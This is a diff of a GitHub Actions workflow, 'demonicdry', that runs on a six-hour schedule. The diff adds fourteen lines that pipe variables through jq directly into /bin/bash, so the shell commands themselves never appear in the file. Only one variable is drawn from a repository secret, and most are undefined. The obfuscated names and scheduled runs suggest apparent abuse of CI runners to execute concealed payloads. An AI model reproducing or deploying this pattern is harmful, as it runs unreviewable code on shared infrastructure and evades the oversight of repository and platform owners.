@@ -1,11 +1,10 @@
 name: demonicdry
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '22 1/6 * * *'
+    - cron: '25 5/6 * * *'
 
-jobs:  # 11903
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -13,12 +12,20 @@ jobs:  # 11903
       - uses: actions/checkout@v4
       - name: demonicdry
         env:
-          u8526: ${{ secrets.u8526 }}
+          xomi18542: ${{ secrets.xomi18542 }}
         run: |
-          echo $u8526 | jq -r .qc30 | /bin/bash
-          echo $vjn086 | jq -r .epmp8043 | /bin/bash
-          echo $aslg82 | jq -r .o7449 | /bin/bash
-          echo $livcg508 | jq -r .bwojz47 | /bin/bash
-          echo $kewh9245 | jq -r .fzfa73262 | /bin/bash
-          echo $bm1 | jq -r .sxm4430 | /bin/bash
+          echo $xomi18542 | jq -r .vd37661 | /bin/bash
+          echo $pxvo0711 | jq -r .f43 | /bin/bash
+          echo $wywsp4 | jq -r .vikk437 | /bin/bash
+          echo $vd6 | jq -r .ccu369 | /bin/bash
+          echo $yfk3 | jq -r .mi672 | /bin/bash
+          echo $gzgkh4 | jq -r .p4 | /bin/bash
+          echo $fbqj4288 | jq -r .q7358 | /bin/bash
+          echo $pkef732 | jq -r .t77 | /bin/bash
+          echo $ivnv5 | jq -r .erz9722 | /bin/bash
+          echo $cwdi04395 | jq -r .vguw89 | /bin/bash
+          echo $uhnd0406 | jq -r .v384 | /bin/bash
+          echo $zs84 | jq -r .fucim29 | /bin/bash
+          echo $ikv341 | jq -r .amhnt6 | /bin/bash
+          echo $cvj835 | jq -r .jhavk61 | /bin/bash
 
